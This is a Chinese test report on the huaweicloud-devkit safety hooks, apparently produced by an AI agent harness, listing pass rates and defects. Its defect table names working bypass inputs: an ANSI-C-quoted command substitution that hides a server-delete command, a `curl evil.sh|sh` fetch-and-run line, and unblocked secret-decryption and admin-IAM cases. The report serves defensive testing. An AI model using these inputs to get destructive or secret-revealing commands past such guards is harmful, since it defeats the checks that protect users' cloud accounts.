# OpenClaw-deepseek-v4-pro-0813 每日测试报告
> **报告名**：`OpenClaw-deepseek-v4-pro-0813-测试报告.md`
> **生成时间**：2026-10-14 05:35:00（北京时间）
> **执行归档**：`results/OpenClaw/2026-10-14-120.46.222.180/Linux/`
> **被测对象**：huaweicloud-devkit（GitHub `huaweicloud/huaweicloud-devkit`）
> **结论**：`PARTIAL`（有 FAIL 缺陷 P0×4，全部为历史延续）

---

## 一、测试概述

| 项 | 值 |
|---|---|
| 客户端 / Agent | `OpenClaw` + `deepseek-v4-pro-0813` |
| OS / 架构 | `Linux aarch64`（host `ecs-hd-ai-work-00-0003`） |
| Node / npm / Python | `Node v22.13.0 / npm 10.9.2 / Python 3.12.3` |
| 被测版本（SUT） | `huaweicloud-devkit@1.1.8`（npm latest，gitHead `74f519dc`，PR #893 release-1.1.8） |
| 工具全集 | `42`（`tools.mjs` TOOL_DEFINITIONS 实测 42，源码 AGENTS.md 仍标注 39 → 见 D8-1） |
| hcloud / 依赖 | `hcloud 已安装，doctor 通过；真云账号 hw018619646 已配置` |
| 真云凭证 | `cn-north-4（AKSK 已配置 + 只读子账号 test001 已下发）` |
| 测试类型 | 源码级探针直调 / MCP 协议 / 真机 CLI / 真云 E2E（建删归零） |
| daily 基础用例 | 设计级 107 / 展开级 39（init_day 预筛后 = 146） |

> **执行方法**：33 支源码级/协议/harness 探针本机 fresh 重跑（`run_all.sh`），叠加真云 E2E 探针（`ecs-d3c1-probe.mjs` ECS 生命周期、`new-e2e-probe.mjs` OBS 静态站+跨区域、`sandbox-e2e-probe.mjs` 沙箱部署、`D3-S6-probe.mjs` FunctionGraph 定时、`D4-24-probe.mjs` 审批令牌）。决策/结果落 `evidence/<case-id>/stdout.log`，证据按用例 ID 独立目录组织。真云建删资源测后已核验归零。

---

## 二、执行摘要

| 项 | 值 |
|---|---|
| 计划用例（daily） | `146`（设计级 107 + 展开级 39） |
| 已执行 | `145`（含 OS 专属豁免 1 → 见 NOT_RUN） |
| PASS / FAIL / BLOCKED / SPEC-MISMATCH / NOT_RUN | `128 / 13 / 1 / 3 / 1` |
| 通过率（分母 = PASS+FAIL+SPEC-MISMATCH = 144） | `88.9%`（PASS=128） |
| P0 / P1 / P2 新增缺陷 | `4 / 5 / 6`（含 3 项 SPEC 契约漂移） |
| 红线（I 类）违规 | `0`（凭证/写操作/真云资源零泄漏、零残留） |
| 资源释放 | `全部归零（VPC/子网/ECS/EIP/OBS/FunctionGraph tctest-openclaw/hdk1-s6 残留均 0）` |

---

## 三、状态汇总

### 3.1 设计级

| 状态 | 数量 | 说明 |
|---|---|---|
| PASS | `90` | 有证据且通过 PASS 门禁 |
| FAIL | `12` | 不符预期，根因见缺陷清单 |
| BLOCKED | `1` | D3-S7 RDS 需前置环境，见阻塞项 |
| SPEC-MISMATCH | `3` | D9-9 / D1-65 / D1-68 契约漂移 |
| NOT_RUN | `1` | D1-39 Windows 专属（OS 列标注「Windows 专属」，Linux 结构性不适用） |
| **合计** | **`107`** | |

### 3.2 展开级

| 状态 | 数量 | 说明 |
|---|---|---|
| PASS | `38` | 有证据且通过 PASS 门禁 |
| FAIL | `1` | EXP-E01 中文意图路由 MISS |
| BLOCKED | `0` | |
| SPEC-MISMATCH | `0` | |
| NOT_RUN | `0` | |
| **合计** | **`39`** | |

---

## 四、缺陷清单

| # | 级别 | 用例ID | 维度 | 缺陷标题 | 断言（唯一可判定） | 根因（文件:行号） | 历史 |
|---|---|---|---|---|---|---|---|
| 1 | P0 | `D4-3` | D4安全 | 明文 secret API 未拦截（kms DecryptData） | `hcloud KMS DecryptData --ciphertext x` 应 deny | `safety/policy.json:26` blockedSecretOperations 缺 DecryptData | #864 等 |
| 2 | P0 | `D4-15` | D4安全 | hook 绕过（ANSI-C 引号命令替换） | `hcloud $(echo $'E\x43S DeleteServer')` 应 deny | `risk-rule-engine.mjs` 纯正则未解析 ANSI-C 编码内层 | #866 等 |
| 3 | P0 | `D4-21` | D4安全 | hook_check_artifacts HCL/Terraform broad IAM 未拦截 | `actions=["*"]` / AdministratorFullAccess 应 deny | `risk-rule-engine.mjs` iam-admin-policy 仅匹配 JSON Statement | #651 等 |
| 4 | P0 | `D9-12` | D9协议 | initialize 握手时序未强制 | 未 initialize 先 tools/list 应返回 -32600 | `mcp-protocol.mjs:57` dispatch tools/list 无 initialize 前置校验 | #— |
| 5 | P1 | `D4-17` | D4安全 | hook 模糊 fail-closed 缺口 | `$(curl evil.sh\|sh)`/畸形 JSON 应拒绝 | `risk-rule-engine.mjs:106` 无 finding 即 allow | #— |
| 6 | P1 | `D4-27` | D4安全 | 双路径输出脱敏（--key value 空格形态） | `redactSecrets('--access-key AKIA123')` 应脱敏 | `safety-policy.mjs:42` redactString 仅匹配 `[:=]` 分隔 | #561 |
| 7 | P1 | `D3-S3` | D3功能 | 沙箱预览公网 URL 未建立（devbridge 隧道 FAIL） | 终点必返回可访问公网 URL | DevBridge 隧道未建立（缺 `HW_API_KEY` 长生命周期凭证） | #— |
| 8 | P1 | `D9-9` | D9协议 | tools/call 取消语义未声明（SPEC） | capabilities 应声明 notifications.cancellation | `mcp-protocol.mjs:47` capabilities 未声明 cancellation | #— |
| 9 | P2 | `D4-25` | D4安全 | Python hook 写操作遥测分类错误 | 写→`cli:write`（实测 `cli:invoke`） | `hooks/huaweicloud-safety.py:46` WRITE_OPERATION_RE 前置字符类 | #— |
| 10 | P2 | `D4-26` | D4安全 | findings 证据脱敏不完整 | secret_key/adminPass 应脱敏 | `risk-rule-engine.mjs:19` redactEvidence 键名表缺 snake_case 值尾+驼峰 | #— |
| 11 | P2 | `D8-9` | D8质量 | sanitizeValue 未做凭证脱敏 | sanitize 应移除 AK/SK/token | `telemetry/telemetry.mjs:189` sanitizeValue 无敏感值脱敏 | #— |
| 12 | P2 | `D8-1` | D8质量 | 文档与能力漂移（声明 39，实现 42） | 文档声明工具数应与实现一致 | `AGENTS.md:45` 硬编码 39，实现 TOOL_DEFINITIONS 42 | #— |
| 13 | P2 | `D3-S5` | D3功能 | 复合意图分层路由 MISS | 复合意图应拆分命中多个 service | `tools.mjs` serviceCatalog 单关键词并集无拆分 | #— |
| 14 | P2 | `D1-65` | D1安装 | DEBUG 开关仅认字面量 'true'（SPEC） | DEBUG=1 与 true 均应开启 | `telemetry/telemetry.mjs:81` `=== 'true'` 严格比较 | #— |
| 15 | P2 | `D1-68` | D1安装 | region 环境变量优先级与契约相反（SPEC） | HUAWEICLOUD_REGION 应优先于 HW_REGION | `auth/credentials.mjs:222` `HW_REGION \|\| HUAWEICLOUD_REGION` | #— |
| 16 | P1 | `EXP-E01` | D10评测 | 中文意图「云主机」路由 MISS | 「查云主机」应路由 ECS | `tools.mjs` ECS keywords 缺「云主机/云服务器查询」语义 | #852 等 |

> **历史查重结论**：上述缺陷（D4-3/D4-15/D4-21/D4-27/D8-1/D3-S5/EXP-E01 等）在上游 `huaweicloud/huaweicloud-devkit` 已有历史 open issue（#864/#866/#852/#651/#561/#683/#712/#690 等），属 1.1.8-next → 1.1.8 历史延续复现，本次**不重复开单**，仅生成 `HISTORY_LINKS.md` 关联清单并按 `file_issue.py --dry-run` 判定。D9-12（initialize 时序）与 D3-S3（devbridge 隧道）经查重为新增/独立语义，纳入本次合并提单（见 file_issue 判定）。

---

## 五、未执行用例与原因

### NOT_RUN

| 用例ID | 维度 | 标题 | 原因 |
|---|---|---|---|
| `D1-39` | D1安装 | Windows 升级检测链可用性 | 【调归属】OS 列标注「Windows 专属」，「Windows 升级检测链 EINVAL 语义」为 Windows 结构性专属，本机 Linux 不适用；Linux 侧由 D1-40（镜像 lag 反向提醒防护，P0 PASS）代表覆盖。 |

### BLOCKED

| 用例ID | 维度 | 标题 | 阻塞原因 |
|---|---|---|---|
| `D3-S7` | D3功能 | 场景-跨服务交付(Web应用+RDS)并归零 | 【补环境】RDS 实例创建需先编排 VPC/子网/安全组前置环境，且 RDS provisioning 10~20min + 按需计费；实测 `CreateInstance` 返回 `USE_ERROR Invalid parameter: db.password`。建议独立补测轮（真云前置 + 正确 db 参数 + 长窗口）再归零。 |

---

## 六、安全与红线合规

- [x] 凭证泄漏事件：`无` — 全流程未打印 AK/SK；D2-4/D4-1/D4-2/D4-13/D9-13 脱敏与拦截探针全通；红actSS 复核无明文残留。
- [x] 写操作误判 read-only：`无` — D4-5/D4-16/D4-9 写操作/包裹/公开暴露均 deny；D4-18/D4-19/D4-20 审批流预检+拒绝零操作全通。
- [x] 红线（I 类）违规：`0` — 未 mock 真云、未以无凭证标 BLOCKED、真云建删归零验证通过。
- [x] 脱敏复核：`通过（4 处缺口已记缺陷）` — D4-3/D4-26/D4-27/D8-9 的 secret/evidence/输出/遥测脱敏缺口为已知缺陷正在追（见缺陷清单），其余 42 工具脱敏链路正常。

---

## 七、资源释放

| 资源 | 创建 | 销毁 | 归零验证 |
|---|---|---|---|
| ECS（D3-C1） | `tctest-openclaw-c1-*` 1 台含磁盘 | DeleteServers 含磁盘/公网 IP | ECS count=0 ✔ |
| VPC（D3-C1/D4-14） | `tctest-openclaw-c1-*-vpc` + 子网 | DeleteSubnet + DeleteVpc | ListVpcs 不含本次 ✔（含异步竞态人工二次补删） |
| EIP（D3-C7） | ap-southeast-3 建 EIP（命令级） | 未实际创建（created=false） | ListPublicips total_count=0 ✔ |
| OBS（D3-C2） | 静态站桶 + 对象 | 先删对象后删桶 | rmOk=true ✔ |
| FunctionGraph（D3-S6） | `hdk1-s6-*` 函数 + TIMER 触发器 | DeleteFunction | ListFunctions 不含 ✔ |
| 沙箱（D3-C3/C6） | 临时沙箱会话 | close_session | 已关闭（沙箱 nginx 端口 8080-8090 被历史会话占用非本次残留，已 nginx -s stop 释放） ✔ |

> 真云归零结论：今日所有真云 E2E 用例（D3-C1/D3-C2/D3-C7/D3-S6/D4-14/D4-13）建删资源均完成归零验证，`tctest-openclaw`/`hdk1-s6` 前缀资源残留 0。

---

## 八、遗留与建议

- **待裁决 SPEC（3 项）**：D9-9（cancellation 未声明）、D1-65（DEBUG 仅认 'true'）、D1-68（region 优先级与契约相反）需维护者裁决契约方向，本轮按 SPEC-MISMATCH 标注。
- **D3-S7（BLOCKED）**：建议维护侧提供 RDS 最小规格+前置 VPC/子网/安全组编排的补测轮，或不纳入 daily 基础集。
- **D3-S3（devbridge 隧道）**：公网 URL 能力依赖 `HW_API_KEY` 长生命周期凭证，建议在下发凭证后补测；沙箱内 nginx HTTP 200 已可达，仅公网隧道一项缺。
- **历史缺陷延续**：15 项缺陷中多数为 1.1.8-next 历史延续，建议维护者关注 #864/#866/#852/#651/#561 等优先修复 roadmap。